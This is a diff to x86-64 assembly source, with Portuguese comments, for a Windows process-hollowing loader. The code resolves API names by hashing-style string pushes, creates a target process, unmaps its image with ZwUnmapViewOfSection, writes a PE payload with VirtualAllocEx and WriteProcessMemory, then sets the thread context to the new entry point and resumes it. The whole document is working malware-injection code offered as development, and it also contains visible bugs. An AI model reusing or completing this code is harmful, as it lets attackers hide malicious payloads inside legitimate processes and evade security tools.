@@ -45,6 +45,7 @@ section .data
        .R14:                                         resq 1
        .R15:                                         resq 1
        .Rip:                                         resq 1
+	   
     endstruc
 	
     ctx istruc CONTEXT 
@@ -150,7 +151,7 @@ section .data
     TamArqProgram times 8                            dq 0
     TamArqTarget times 8                             dq 0
     bufferFileName times 32                          db 0
-    Buffer times 800000                              db 0
+    Buffer times 800000                              dq 0
     addressAlocado times 8                           dq 0
     addressAlocadoEx times 8                         dq 0
     handle times 8                                   dq 0
@@ -160,16 +161,26 @@ section .data
     openProcessH times 8                             dq 0
     lpContext times 8                                dd 0 
     allocex times 8                                  dd 0 
-    AddressEntryPoint times 8                        dd 0
     alloc times 8                                    dd 0
     lpImageBase times 8                              dd 0
     VA times 8                                       dd 0
     lpAllocatedBaset times 8                         dd 0
     PE times 8                                       dq 0
-    lpPreferableBase dd 0x400000
-    Sec times 8                                      dq 0
-    zero times 8                                     dd 0
+    ImageBase times 16                               dq 0
+    Secion times 8                                   dq 0
+    NumSecion times 8                                db 0
     Ptrt times 8                                     dq 0
+    RS times 8                                       dq 0
+    RW times 8                                       dq 0
+    Thread times 8                                   dq 0
+    void times 8                                     dq 0
+    alloex2 times 8                                  dq 0
+    vUnk times 8                                     dq 0
+    zero times 8                                     dq 0
+    address750 times 8                               dq 0
+	
+    jmpDelta db 0
+    Ptrt0 dq 0x00
 
 section .codered
 	CodeRed:
@@ -181,8 +192,7 @@ section .deccode
 	
 	;GetProcddress no registrador R14
 	call Locate_kernel32
-	
-	
+		
 	;Lookup CreateProcessA
 	mov rax, 0x41737365636f
 	push rax
@@ -238,8 +248,7 @@ section .deccode
 	mov r12,rax
 	add rsp, 0x30
 	add rsp, 0x10
-	
-	
+		
 	;call VirtualAlloc
 	mov r9d, 0x04
 	mov r8d, 0x1000
@@ -275,22 +284,23 @@ section .deccode
 	mov ebx, [eax]
 	mov [GetSizeTarget],ebx
 	mov [lpImageBase], rcx
-	
+		
+	mov rax, [lpImageBase]
+	mov rcx, [lpImageBase]
+	xor rdi,rdi
+	add rax, 0x3c
+	mov edi, [eax]
+	mov rax, rcx
+	add eax, edi
+	mov [PE], rax
+	add rax, 0x30
+	xor rdi,Rdi
+	mov rdi, [rax]
+	mov [ImageBase], rdi
 	
 	call Locate_kernel32
 	;lookup GetThreadContext
-	mov rax, "dContext"
-	push Rax
-	mov rax, "GetThrea" 
-	push rax
-	mov [rsp+0x10], dword 0x00
-	lea rdx, [rsp]
-	mov rcx, r8
-	sub rsp, 0x30
-	call R14
-	add rsp,0x30
-	add rsp,0x10
-	mov r12, rax
+	call GetThreadCx
 	
 	;call GetThreadContext
 	mov [ctx+CONTEXT.ContextFlags], dword 0x100002
@@ -299,7 +309,6 @@ section .deccode
 	mov rcx, rax
 	call r12
 	
-	
 	;ReadProcessMemory
 	call ReadProcessMemory
 	
@@ -307,8 +316,9 @@ section .deccode
 	mov rax, [ctx+CONTEXT.Rdx]
 	mov edx, 0x10
 	add rax,rdx
-	mov rdx, Rax
- 
+	mov [void], rax
+	
+	mov rdx, [void]
 	lea rcx, [lpPebImageBase]
 	xor rdi,rdi
 	mov [rsp+0x20], rdi
@@ -317,7 +327,6 @@ section .deccode
 	mov rcx,[ProcInfo+PROCESSINFO.hProcess]
 	call r12
 	
-	
 	mov rax, [lpImageBase]
 	mov rcx, [lpImageBase]
 	xor rdi,rdi
@@ -325,18 +334,19 @@ section .deccode
 	mov edi, [eax]
 	mov rax, rcx
 	add eax, edi
+	mov [PE], rax
 	add rax, 0x38
 	xor rdi, rdi
 	mov edi, [eax]
 	mov [VA], eax
 	
+	mov rax, [lpPebImageBase]
+	mov rdi , [ImageBase]
+	cmp rax,Rdi
+	jne lpAllocatedBase 
+	call Locate_ntdll
 	
 	;ZwUnmapViewOfSection
-	mov rax, [lpPreferableBase]
-	cmp rax, [lpPebImageBase]
-	jne lpAllocatedBase ; Pula se não for igual address 0x400000
-	call Locate_ntdll
-
 	mov rax, "tion"
 	push Rax
 	mov rax, "iewOfSec"
@@ -356,15 +366,13 @@ section .deccode
 	mov rdx, [lpPebImageBase]
 	call rax
 	
-	
-	
 	lpAllocatedBase:
 		call Locate_kernel32
 		call LoadLibrary
 		mov rbx,rcx
 		
 		loadKernelbase:
-			; Load kernelbase.dll
+			 ;Load kernelbase.dll
 			mov rax, "se.dll"     
 			push rax
 			mov rax, "kernelba"
@@ -375,61 +383,92 @@ section .deccode
 			mov r15,rax
 			add rsp, 0x30
 			add rsp, 0x10
-
-
+			
 			call Locate_kernel32
 			;Lookup VirtualAllocEx
 			call VirtualAllocEx
 			;call VirtualAllocEx
-			xor rcx,rcx
-			xor rbx,rbx
-			xor rdx,rdx
-			mov rdx, 0x400000
+			mov rax, [PE]
+			mov eax, dword[rax+0x50]
+			mov ecx,eax
+			mov rdx, [ImageBase]
 			mov r8d, [GetSizeTarget]
 			mov r9d, 0x3000
 			mov [rsp+0x20], dword 0x40
 			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
 			mov rdi, r13
 			call r12
-			mov rbx, r15
 			mov [allocex],rax
 			
-			mov [rbp+0x710], Rax
-			mov rax, [rbp+0x710]
+			mov rax, [allocex]
 			test rax,Rax
 			sete al
 			test al, al
-			je Decisao
-
-		Decisao:
-			mov [rbp+710], Rax
-			mov rax, [rbp+0x710]
-			cmp [lpImageBase], rax
-			je Decisao2
+			je pulo 
 			
-		Decisao2:
-			xor Rcx,Rcx
-			xor rax,Rax
-			xor rdi,rdi
-			mov rax, [lpImageBase]
-			mov rcx, [lpImageBase]
-			add rax, 0x3c
-			mov edx, [eax]
-			mov rax, Rcx
-			add eax, edx
-			mov [PE], rax
+			pulo:
+			mov rax,  [allocex]
+			cmp rax, [lpPebImageBase]
+			je Decisao1
+				
+			call Locate_kernel32 
+			;Lookup WriteProcess
+			call WriteProcess
+			lea r8, [allocex]
+			mov rdx, [void]
+			lea  rcx,[pt20]
+			mov [rsp+0x20], Rcx
+			mov r9d, 8
+			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
+			call r12
+			add rsp, 0x30
 			
-			xor rax,Rax
+			Decisao1:
 			mov rax, [PE]
-			mov [rax+0x5C], word 0x02
-			mov rdx, [lpImageBase]
-			mov rax, [lpImageBase]
-			je SetWrite
+			mov word[rax+0x5C], 2
+			mov rax, [ImageBase]
+			mov rdx, [ImageBase]
+			cmp rdx,Rax
+			je Writable
 			
+			mov rax, [PE]
+			movzx eax, word[rax+0x16]
+			movzx eax, ax
+			and eax, 1
+			test eax,eax
+			je Pulo2
 			
-		SetWrite:
+			Pulo2:
+						
+			
+	Writable:
 			call Locate_kernel32
-			;lookup GetThreadContext
+			;Guarda offset PE
+			mov rax,  [PE]
+			mov eax, dword[rax+0x28]
+			xor rdx,Rdx
+			mov edx,eax
+			mov rax, [ImageBase]
+			add rax,rdx
+			mov[ctx+CONTEXT.Rcx], rax
+				
+			call Locate_kernel32
+			call LoadLibrary
+			;call LoadLibrary
+			mov r13, r15
+			;Load kernelbase.dll
+			mov rax, "se.dll"     
+			push rax
+			mov rax, "kernelba"
+			push rax
+			mov rcx, rsp
+			sub rsp, 0x30
+			call rsi
+			mov r15,rax
+			add rsp, 0x30
+			add rsp, 0x10
+			call Locate_kernel32
+			;lookup SetThreadContext
 			mov rax, "dContext"
 			push Rax
 			mov rax, "SetThrea" 
@@ -443,137 +482,69 @@ section .deccode
 			add rsp,0x10
 			mov r12, rax
 		
-			mov rax, [PE]
-			mov eax, dword [rax+0x28]
-			mov edx, eax
-			mov rax, [lpImageBase]
-			add rax,RDX
-			mov [ctx+CONTEXT.Rdx], Rax
 			mov rax, [ProcInfo+PROCESSINFO.hThread]
 			lea rdx, [ctx+CONTEXT.P1Home]
 			mov rcx, Rax
-			call r12			
+			call r12
 			
-			
-			call Locate_kernel32 
-			call LoadLibrary
-			mov r13, r15
-			;Load kernelbase.dll
-			mov rax, "se.dll"     
-			push rax
-			mov rax, "kernelba"
-			push rax
-			mov rcx, rsp
-			sub rsp, 0x30
-			call rsi
-			mov r15,rax
+			call Locate_kernel32
+			;Lookup WriteProcess
+			call WriteProcess
+			;call WriteProcessMemory
+			mov rax, [PE]
+			mov eax, dword[rax+0x54]
+			mov r9d,eax
+			mov r8, [lpImageBase]
+			mov rdx, [ImageBase]
+			xor rbx,Rbx
+			push rbx
+			mov [rsp+0x20],rsp
+			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
+			call r12
+			mov rbp, rax
 			add rsp, 0x30
-			add rsp, 0x10
-	
-	      ;delta
-
-
-		;Lookup WriteProcess
-		call WriteProcess
-		
-		;call WriteProcessMemory
-		mov rax, [PE]
-		mov eax, dword[rax+0x54]
-		mov r9d,eax
-		xor ebx,ebx
-		mov r8,[lpImageBase]
-		mov [rsp+0x20], rbx
-		mov rdx, [lpPreferableBase]
-		mov rcx, [ProcInfo+PROCESSINFO.hProcess]
-		call r12
-		mov rbp, rax
-		add rsp, 0x30
-		
-		call Locate_kernel32
-		;Lookuop VirtualProectEx
-		call VirtualProectEx
-		;call VirtualProtectEx
-		mov rax, [PE]
-		mov eax,  dword[rax+0x54]
-		mov r8d, eax
-		mov rdx, [allocex]
-		xor rcx,rcx
-		push rcx
-		lea rcx, [rsp]
-		mov [rsp+0x20],rcx
-		mov r9d, 2
-		mov rcx, [ProcInfo+PROCESSINFO.hProcess]
-		call r12
-		add rsp, 0x30
-		
-		mov rax, [lpImageBase]
-		mov eax, [rax+0x3C]
-		movsxd rdx,eax
-		mov rax, [lpImageBase]
-		add rax, Rdx
-		add rax, 0x108
-		mov [Sec], Rax
-		mov dword[zero], 0
-		jmp Decisao3
-	Delta:
-		;lookup WriteProcessMemory
-		call WriteProcess
-		mov eax, dword[zero]
-		movsxd rdx,eax
-		mov rax,Rdx
-		shl rax, 0x2
-		add rax,Rdx
-		shl rax, 0x3
-		mov rdx, Rax
-		mov rax, [Sec]
-		add rax, Rdx
-		mov eax, dword [rax+0x10]
-		mov r9d, eax
-		mov eax, dword[zero]
-		movsxd rdx,eax
-		mov rax,Rdx
-		shl rax, 0x2
-		add rax,Rdx
-		shl rax, 0x3
-		mov rdx,Rax
-		mov rax, [Sec]
-		add rax,Rdx
-		mov eax, dword [rax+0x14]
-		mov edx,eax
-		mov rax, [lpImageBase]
-		add rax,Rdx
-		mov r8, Rax
-		mov rax, [Sec]
-		xor rdx,rdx
-		mov edx, dword [rax+0x0c]
-		xor rax,rax
-		mov eax, [lpPreferableBase]
-		add rax,Rdx
-		mov rcx, rax
-		mov rax, [ProcInfo+PROCESSINFO.hProcess] 
-		lea rdi, [Ptrt]
-		mov [rsp+0x20],Rdi
-		mov rdx, rcx
-		mov rcx, Rax
-		call r12
-        
+				
+			call Locate_kernel32
+			;Lookup VirtualProectEx
+			call VirtualProectEx
+			mov rax, [PE]
+			mov eax, dword[rax+0x54]
+			mov r8d, eax
+			mov rdx, [ImageBase]
+			push Rcx
+			mov rcx,rsp
+			mov [rsp+0x20],Rcx
+			mov r9d, 0x02
+			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
+			call r12
+			
+			mov rax, [lpImageBase]
+			mov eax, [rax+0x3c]
+			movsxd rdx,eax
+			mov rax, [lpPebImageBase]
+			add rax,Rdx
+			add rax, 0x108
+			mov [address750], rax
+			mov [zero], dword 0x00
+			jmp Final
+		Delta:
 		
 		
-		
-		
-	Decisao3:
-		mov rax, [PE]
-		movzx eax, word [rax+0x06]
-		movzx eax,ax
-		cmp eax, dword[zero]
+			
+			
+			
+			
+		mov rax, [PE] 
+		movzx ex, word [rax+0x06]
+		movzx eax, ax
+		cmp eax, [zero]
 		jg Delta
 		
 		
+		call Locate_kernel32
+		call VirtualProectEx
 		
-		
-	
-	;delta   
-	Resume:
+			
 		call Locate_kernel32 
 		mov rax, "read"
 		push rax
@@ -1062,7 +1033,7 @@ VirtualProectEx:
 ret
 
 WriteProcess:
-	;Lookup WriteProcessMemory
+	;Lookup WriteProcess
 	mov rax, "ry"
 	push rax
 	mov rax, "cessMemo"
@@ -1079,6 +1050,7 @@ WriteProcess:
 ret
 
 VirtualAllocEx:
+	;Lookup VirtualAllocEx
 	mov rax, "llocEx"
 	push rax
 	mov rax, "VirtualA"
@@ -1093,6 +1065,7 @@ VirtualAllocEx:
 ret
 
 ReadProcessMemory:
+	;Lookup ReadProcessMemory
 	mov rax, "y"
 	push Rax
 	mov rax, "essMemor"
@@ -1107,4 +1080,40 @@ ReadProcessMemory:
 	add rsp, 0x10
 	add rsp, 0x08
 	mov r12, rax
+ret
+
+GetThreadCx:
+	;Lookup GetThreadCx
+	sub rsp, 0x30
+	mov rax, "dContext"
+	push Rax
+	mov rax, "GetThrea" 
+	push rax
+	mov [rsp+0x10], dword 0x00
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call R14
+	add rsp,0x30
+	add rsp,0x10
+	add rsp, 0x30
+	mov r12, rax
+ret
+
+CreateRemoteThread:
+	;Lookup CreateRemoteThread
+	mov rax, "ad"
+	push rax
+	mov rax, "moteThre"
+	push rax
+	mov rax, "CreateRe"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14
+	add rsp, 0x30
+	add rsp, 0x10
+	add rsp, 0x08
+	mov r12,rax
 ret
